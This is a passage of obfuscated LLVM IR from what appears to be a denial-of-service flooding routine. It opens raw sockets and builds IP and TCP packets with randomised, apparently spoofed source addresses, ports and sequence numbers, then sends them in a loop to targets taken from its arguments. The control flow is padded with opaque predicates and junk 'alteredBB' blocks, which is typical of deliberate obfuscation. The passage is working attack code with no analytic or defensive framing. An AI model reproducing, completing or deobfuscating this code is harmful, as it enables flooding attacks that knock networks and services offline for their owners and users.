  %328 = load i8, i8* %327, align 4
  %329 = and i8 %328, 15
  %330 = or i8 %329, 64
  store i8 %330, i8* %327, align 4
  %331 = load i8, i8* %16, align 1
  %332 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 1
  store i8 %331, i8* %333, align 1
  %334 = load i16, i16* %5, align 2
  %335 = zext i16 %334 to i64
  %336 = add i64 40, %335
  %337 = trunc i64 %336 to i16
  %338 = call zeroext i16 @htons(i16 zeroext %337) #9
  %339 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 2
  store i16 %338, i16* %340, align 2
  %341 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %342 = bitcast %struct.iphdr* %341 to i8*
  %343 = load i8, i8* %342, align 4
  %344 = and i8 %343, -16
  %345 = or i8 %344, 5
  store i8 %345, i8* %342, align 4
  %346 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 4
  store i16 0, i16* %347, align 2
  %348 = load i8, i8* %7, align 1
  %349 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 5
  store i8 %348, i8* %350, align 4
  %351 = load i16, i16* %17, align 2
  %352 = call zeroext i16 @htons(i16 zeroext %351) #9
  %353 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 3
  store i16 %352, i16* %354, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 6
  store i8 6, i8* %356, align 1
  %357 = load i32, i32* %19, align 4
  %358 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 8
  store i32 %357, i32* %359, align 4
  %360 = load %struct.arguments*, %struct.arguments** %2, align 8
  %361 = getelementptr inbounds %struct.arguments, %struct.arguments* %360, i32 0, i32 0
  %362 = load %struct.target*, %struct.target** %361, align 8
  %363 = load i32, i32* %3, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.target, %struct.target* %362, i64 %364
  %366 = getelementptr inbounds %struct.target, %struct.target* %365, i32 0, i32 0
  %367 = load i32, i32* %366, align 4
  %368 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  store i32 %367, i32* %369, align 4
  %370 = load i16, i16* %6, align 2
  %371 = call zeroext i16 @htons(i16 zeroext %370) #9
  %372 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 0
  %374 = bitcast %union.anon* %373 to %struct.anon.0*
  %375 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %374, i32 0, i32 1
  store i16 %371, i16* %375, align 2
  %376 = load i16, i16* %8, align 2
  %377 = call zeroext i16 @htons(i16 zeroext %376) #9
  %378 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon* %379 to %struct.anon.0*
  %381 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %380, i32 0, i32 0
  store i16 %377, i16* %381, align 4
  %382 = load i32, i32* %18, align 4
  %383 = trunc i32 %382 to i16
  %384 = call zeroext i16 @htons(i16 zeroext %383) #9
  %385 = zext i16 %384 to i32
  %386 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon* %387 to %struct.anon.0*
  %389 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %388, i32 0, i32 2
  store i32 %385, i32* %389, align 4
  %390 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 0
  %392 = bitcast %union.anon* %391 to %struct.anon.0*
  %393 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %392, i32 0, i32 4
  %394 = load i16, i16* %393, align 4
  %395 = and i16 %394, -241
  %396 = or i16 %395, 80
  store i16 %396, i16* %393, align 4
  %397 = load i8, i8* %10, align 1
  %398 = sext i8 %397 to i16
  %399 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 0
  %401 = bitcast %union.anon* %400 to %struct.anon.0*
  %402 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %401, i32 0, i32 4
  %403 = load i16, i16* %402, align 4
  %404 = and i16 %398, 1
  %405 = shl i16 %404, 12
  %406 = and i16 %403, -4097
  %407 = or i16 %406, %405
  store i16 %407, i16* %402, align 4
  %408 = load i8, i8* %11, align 1
  %409 = sext i8 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 4
  %414 = load i16, i16* %413, align 4
  %415 = and i16 %409, 1
  %416 = shl i16 %415, 8
  %417 = and i16 %414, -257
  %418 = or i16 %417, %416
  store i16 %418, i16* %413, align 4
  %419 = load i8, i8* %12, align 1
  %420 = sext i8 %419 to i16
  %421 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %422 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %421, i32 0, i32 0
  %423 = bitcast %union.anon* %422 to %struct.anon.0*
  %424 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %423, i32 0, i32 4
  %425 = load i16, i16* %424, align 4
  %426 = and i16 %420, 1
  %427 = shl i16 %426, 13
  %428 = and i16 %425, -8193
  %429 = or i16 %428, %427
  store i16 %429, i16* %424, align 4
  %430 = load i8, i8* %13, align 1
  %431 = sext i8 %430 to i16
  %432 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 0
  %434 = bitcast %union.anon* %433 to %struct.anon.0*
  %435 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %434, i32 0, i32 4
  %436 = load i16, i16* %435, align 4
  %437 = and i16 %431, 1
  %438 = shl i16 %437, 11
  %439 = and i16 %436, -2049
  %440 = or i16 %439, %438
  store i16 %440, i16* %435, align 4
  %441 = load i8, i8* %14, align 1
  %442 = sext i8 %441 to i16
  %443 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 0
  %445 = bitcast %union.anon* %444 to %struct.anon.0*
  %446 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = and i16 %442, 1
  %449 = shl i16 %448, 10
  %450 = and i16 %447, -1025
  %451 = or i16 %450, %449
  store i16 %451, i16* %446, align 4
  %452 = load i8, i8* %15, align 1
  %453 = sext i8 %452 to i16
  %454 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 0
  %456 = bitcast %union.anon* %455 to %struct.anon.0*
  %457 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %456, i32 0, i32 4
  %458 = load i16, i16* %457, align 4
  %459 = and i16 %453, 1
  %460 = shl i16 %459, 9
  %461 = and i16 %458, -513
  %462 = or i16 %461, %460
  store i16 %462, i16* %457, align 4
  %463 = call i32 @rand_new()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon* %467 to %struct.anon.0*
  %469 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %468, i32 0, i32 5
  store i16 %465, i16* %469, align 2
  %470 = load i32, i32* %20, align 4
  %471 = trunc i32 %470 to i16
  %472 = call zeroext i16 @htons(i16 zeroext %471) #9
  %473 = zext i16 %472 to i32
  %474 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon* %475 to %struct.anon.0*
  %477 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %476, i32 0, i32 3
  store i32 %473, i32* %477, align 4
  %478 = load i8*, i8** %26, align 8
  %479 = load i16, i16* %5, align 2
  %480 = zext i16 %479 to i32
  call void @rand_string(i8* %478, i32 %480)
  %481 = load i32, i32* @x.19
  %482 = load i32, i32* @y.20
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBBpart2174, label %originalBB10alteredBB

originalBBpart2174:                               ; preds = %originalBB10
  br label %489

; <label>:489:                                    ; preds = %originalBBpart2174
  %490 = load i32, i32* %3, align 4
  %491 = add nsw i32 %490, 1
  store i32 %491, i32* %3, align 4
  br label %198

; <label>:492:                                    ; preds = %198
  br label %493

; <label>:493:                                    ; preds = %764, %492
  %494 = load i32, i32* @x.19
  %495 = load i32, i32* @y.20
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %493
  store i32 0, i32* %3, align 4
  %502 = load i32, i32* @x.19
  %503 = load i32, i32* @y.20
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %510

; <label>:510:                                    ; preds = %761, %originalBBpart2178
  %511 = load i32, i32* @x.19
  %512 = load i32, i32* @y.20
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %510
  %519 = load i32, i32* %3, align 4
  %520 = load %struct.arguments*, %struct.arguments** %2, align 8
  %521 = getelementptr inbounds %struct.arguments, %struct.arguments* %520, i32 0, i32 3
  %522 = load i8, i8* %521, align 1
  %523 = zext i8 %522 to i32
  %524 = icmp slt i32 %519, %523
  %525 = load i32, i32* @x.19
  %526 = load i32, i32* @y.20
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %524, label %533, label %764

; <label>:533:                                    ; preds = %originalBBpart2182
  %534 = load i32, i32* @x.19
  %535 = load i32, i32* @y.20
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %533
  %542 = load i8**, i8*** %9, align 8
  %543 = load i32, i32* %3, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds i8*, i8** %542, i64 %544
  %546 = load i8*, i8** %545, align 8
  %547 = bitcast i8* %546 to %struct.iphdr*
  store %struct.iphdr* %547, %struct.iphdr** %27, align 8
  %548 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i64 1
  %550 = bitcast %struct.iphdr* %549 to %struct.tcphdr*
  store %struct.tcphdr* %550, %struct.tcphdr** %28, align 8
  %551 = load %struct.arguments*, %struct.arguments** %2, align 8
  %552 = getelementptr inbounds %struct.arguments, %struct.arguments* %551, i32 0, i32 0
  %553 = load %struct.target*, %struct.target** %552, align 8
  %554 = load i32, i32* %3, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.target, %struct.target* %553, i64 %555
  %557 = getelementptr inbounds %struct.target, %struct.target* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 4
  %559 = zext i16 %558 to i32
  %560 = icmp slt i32 %559, 32
  %561 = load i32, i32* @x.19
  %562 = load i32, i32* @y.20
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br i1 %560, label %569, label %589

; <label>:569:                                    ; preds = %originalBBpart2186
  %570 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %571 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %570, i32 0, i32 9
  %572 = load i32, i32* %571, align 4
  %573 = call i32 @ntohl(i32 %572) #9
  %574 = call i32 @rand_new()
  %575 = load %struct.arguments*, %struct.arguments** %2, align 8
  %576 = getelementptr inbounds %struct.arguments, %struct.arguments* %575, i32 0, i32 0
  %577 = load %struct.target*, %struct.target** %576, align 8
  %578 = load i32, i32* %3, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds %struct.target, %struct.target* %577, i64 %579
  %581 = getelementptr inbounds %struct.target, %struct.target* %580, i32 0, i32 1
  %582 = load i16, i16* %581, align 4
  %583 = zext i16 %582 to i32
  %584 = lshr i32 %574, %583
  %585 = add i32 %573, %584
  %586 = call i32 @htonl(i32 %585) #9
  %587 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %588 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %587, i32 0, i32 9
  store i32 %586, i32* %588, align 4
  br label %589

; <label>:589:                                    ; preds = %569, %originalBBpart2186
  %590 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 8
  %592 = load i32, i32* %591, align 4
  %593 = icmp eq i32 %592, -1
  br i1 %593, label %594, label %598

; <label>:594:                                    ; preds = %589
  %595 = call i32 @rand_new()
  %596 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %597 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %596, i32 0, i32 8
  store i32 %595, i32* %597, align 4
  br label %598

; <label>:598:                                    ; preds = %594, %589
  %599 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %600 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %599, i32 0, i32 3
  %601 = load i16, i16* %600, align 4
  %602 = zext i16 %601 to i32
  %603 = icmp eq i32 %602, 65535
  br i1 %603, label %604, label %610

; <label>:604:                                    ; preds = %598
  %605 = call i32 @rand_new()
  %606 = and i32 %605, 65535
  %607 = trunc i32 %606 to i16
  %608 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 3
  store i16 %607, i16* %609, align 4
  br label %610

; <label>:610:                                    ; preds = %604, %598
  %611 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 0
  %613 = bitcast %union.anon* %612 to %struct.anon.0*
  %614 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %613, i32 0, i32 1
  %615 = load i16, i16* %614, align 2
  %616 = zext i16 %615 to i32
  %617 = icmp eq i32 %616, 65535
  br i1 %617, label %618, label %626

; <label>:618:                                    ; preds = %610
  %619 = call i32 @rand_new()
  %620 = and i32 %619, 65535
  %621 = trunc i32 %620 to i16
  %622 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %623 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %622, i32 0, i32 0
  %624 = bitcast %union.anon* %623 to %struct.anon.0*
  %625 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %624, i32 0, i32 1
  store i16 %621, i16* %625, align 2
  br label %626

; <label>:626:                                    ; preds = %618, %610
  %627 = load i32, i32* @x.19
  %628 = load i32, i32* @y.20
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %626
  %635 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 0
  %637 = bitcast %union.anon* %636 to %struct.anon.0*
  %638 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %637, i32 0, i32 0
  %639 = load i16, i16* %638, align 4
  %640 = zext i16 %639 to i32
  %641 = icmp eq i32 %640, 65535
  %642 = load i32, i32* @x.19
  %643 = load i32, i32* @y.20
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br i1 %641, label %650, label %658

; <label>:650:                                    ; preds = %originalBBpart2190
  %651 = call i32 @rand_new()
  %652 = and i32 %651, 65535
  %653 = trunc i32 %652 to i16
  %654 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %655 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %654, i32 0, i32 0
  %656 = bitcast %union.anon* %655 to %struct.anon.0*
  %657 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %656, i32 0, i32 0
  store i16 %653, i16* %657, align 4
  br label %658

; <label>:658:                                    ; preds = %650, %originalBBpart2190
  %659 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %660 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %659, i32 0, i32 0
  %661 = bitcast %union.anon* %660 to %struct.anon.0*
  %662 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %661, i32 0, i32 2
  %663 = load i32, i32* %662, align 4
  %664 = icmp eq i32 %663, 65535
  br i1 %664, label %665, label %672

; <label>:665:                                    ; preds = %658
  %666 = call i32 @rand_new()
  %667 = and i32 %666, 65535
  %668 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %669 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %668, i32 0, i32 0
  %670 = bitcast %union.anon* %669 to %struct.anon.0*
  %671 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %670, i32 0, i32 2
  store i32 %667, i32* %671, align 4
  br label %672

; <label>:672:                                    ; preds = %665, %658
  %673 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %674 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %673, i32 0, i32 0
  %675 = bitcast %union.anon* %674 to %struct.anon.0*
  %676 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %675, i32 0, i32 3
  %677 = load i32, i32* %676, align 4
  %678 = icmp eq i32 %677, 65535
  br i1 %678, label %679, label %702

; <label>:679:                                    ; preds = %672
  %680 = load i32, i32* @x.19
  %681 = load i32, i32* @y.20
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %679
  %688 = call i32 @rand_new()
  %689 = and i32 %688, 65535
  %690 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %691 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %690, i32 0, i32 0
  %692 = bitcast %union.anon* %691 to %struct.anon.0*
  %693 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %692, i32 0, i32 3
  store i32 %689, i32* %693, align 4
  %694 = load i32, i32* @x.19
  %695 = load i32, i32* @y.20
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBBpart2199, label %originalBB192alteredBB

originalBBpart2199:                               ; preds = %originalBB192
  br label %702

; <label>:702:                                    ; preds = %originalBBpart2199, %672
  %703 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 7
  store i16 0, i16* %704, align 2
  %705 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %706 = bitcast %struct.iphdr* %705 to i16*
  %707 = call zeroext i16 @ip_header_checksum(i16* %706, i32 20)
  %708 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %709 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %708, i32 0, i32 7
  store i16 %707, i16* %709, align 2
  %710 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %711 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %710, i32 0, i32 0
  %712 = bitcast %union.anon* %711 to %struct.anon.0*
  %713 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %712, i32 0, i32 6
  store i16 0, i16* %713, align 4
  %714 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %715 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %716 = bitcast %struct.tcphdr* %715 to i8*
  %717 = load i16, i16* %5, align 2
  %718 = zext i16 %717 to i64
  %719 = add i64 20, %718
  %720 = trunc i64 %719 to i16
  %721 = call zeroext i16 @htons(i16 zeroext %720) #9
  %722 = load i16, i16* %5, align 2
  %723 = zext i16 %722 to i64
  %724 = add i64 20, %723
  %725 = trunc i64 %724 to i32
  %726 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %714, i8* %716, i16 zeroext %721, i32 %725)
  %727 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %728 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %727, i32 0, i32 0
  %729 = bitcast %union.anon* %728 to %struct.anon.0*
  %730 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %729, i32 0, i32 6
  store i16 %726, i16* %730, align 4
  %731 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %731, align 4
  %732 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %733 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %732, i32 0, i32 0
  %734 = bitcast %union.anon* %733 to %struct.anon.0*
  %735 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %734, i32 0, i32 1
  %736 = load i16, i16* %735, align 2
  %737 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %736, i16* %737, align 2
  %738 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %739 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %738, i32 0, i32 9
  %740 = load i32, i32* %739, align 4
  %741 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %742 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %741, i32 0, i32 0
  store i32 %740, i32* %742, align 4
  %743 = load i32*, i32** %22, align 8
  %744 = load i32, i32* %3, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i32, i32* %743, i64 %745
  %747 = load i32, i32* %746, align 4
  %748 = load i8**, i8*** %9, align 8
  %749 = load i32, i32* %3, align 4
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds i8*, i8** %748, i64 %750
  %752 = load i8*, i8** %751, align 8
  %753 = load i16, i16* %5, align 2
  %754 = zext i16 %753 to i64
  %755 = add i64 40, %754
  %756 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %757 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %757, %struct.sockaddr** %756, align 8
  %758 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %759 = load %struct.sockaddr*, %struct.sockaddr** %758, align 8
  %760 = call i64 @sendto(i32 %747, i8* %752, i64 %755, i32 16384, %struct.sockaddr* %759, i32 16)
  br label %761

; <label>:761:                                    ; preds = %702
  %762 = load i32, i32* %3, align 4
  %763 = add nsw i32 %762, 1
  store i32 %763, i32* %3, align 4
  br label %510

; <label>:764:                                    ; preds = %originalBBpart2182
  br label %493
                                                  ; No predecessors!
  %766 = load i32, i32* @x.19
  %767 = load i32, i32* @y.20
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %765
  %774 = load i32, i32* @x.19
  %775 = load i32, i32* @y.20
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %171
  %782 = load %struct.arguments*, %struct.arguments** %2, align 8
  %783 = getelementptr inbounds %struct.arguments, %struct.arguments* %782, i32 0, i32 3
  %784 = load i8, i8* %783, align 1
  %785 = zext i8 %784 to i64
  %786 = call noalias i8* @calloc(i64 %785, i64 4) #8
  %787 = bitcast i8* %786 to i32*
  store i32* %787, i32** %22, align 8
  %788 = load i32*, i32** %22, align 8
  %789 = icmp ne i32* %788, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %205
  %790 = call i32 @socket(i32 2, i32 3, i32 6) #8
  %791 = load i32*, i32** %22, align 8
  %792 = load i32, i32* %3, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds i32, i32* %791, i64 %793
  store i32 %790, i32* %794, align 4
  %795 = load i32*, i32** %22, align 8
  %796 = load i32, i32* %3, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds i32, i32* %795, i64 %797
  %799 = load i32, i32* %798, align 4
  %800 = icmp eq i32 %799, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %286
  %801 = load i8**, i8*** %9, align 8
  %802 = bitcast i8** %801 to i8*
  call void @free(i8* %802) #8
  call void @exit(i32 1) #10
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %305
  %803 = load i8**, i8*** %9, align 8
  %804 = load i32, i32* %3, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds i8*, i8** %803, i64 %805
  %807 = load i8*, i8** %806, align 8
  %808 = bitcast i8* %807 to %struct.iphdr*
  store %struct.iphdr* %808, %struct.iphdr** %24, align 8
  %809 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %810 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %809, i64 1
  %811 = bitcast %struct.iphdr* %810 to %struct.tcphdr*
  store %struct.tcphdr* %811, %struct.tcphdr** %25, align 8
  %812 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %813 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %812, i64 1
  %814 = bitcast %struct.tcphdr* %813 to i8*
  store i8* %814, i8** %26, align 8
  %815 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %816 = bitcast %struct.iphdr* %815 to i8*
  %817 = load i8, i8* %816, align 4
  %_ = shl i8 %817, 15
  %_11 = shl i8 %817, 15
  %_12 = shl i8 %817, 15
  %_13 = sub i8 %817, 15
  %gen = mul i8 %_13, 15
  %_14 = shl i8 %817, 15
  %818 = and i8 %817, 15
  %_15 = sub i8 0, %818
  %gen16 = add i8 %_15, 64
  %_17 = shl i8 %818, 64
  %_18 = sub i8 0, %818
  %gen19 = add i8 %_18, 64
  %819 = or i8 %818, 64
  store i8 %819, i8* %816, align 4
  %820 = load i8, i8* %16, align 1
  %821 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %822 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %821, i32 0, i32 1
  store i8 %820, i8* %822, align 1
  %823 = load i16, i16* %5, align 2
  %824 = zext i16 %823 to i64
  %_20 = shl i64 40, %824
  %825 = add i64 40, %824
  %826 = trunc i64 %825 to i16
  %827 = call zeroext i16 @htons(i16 zeroext %826) #9
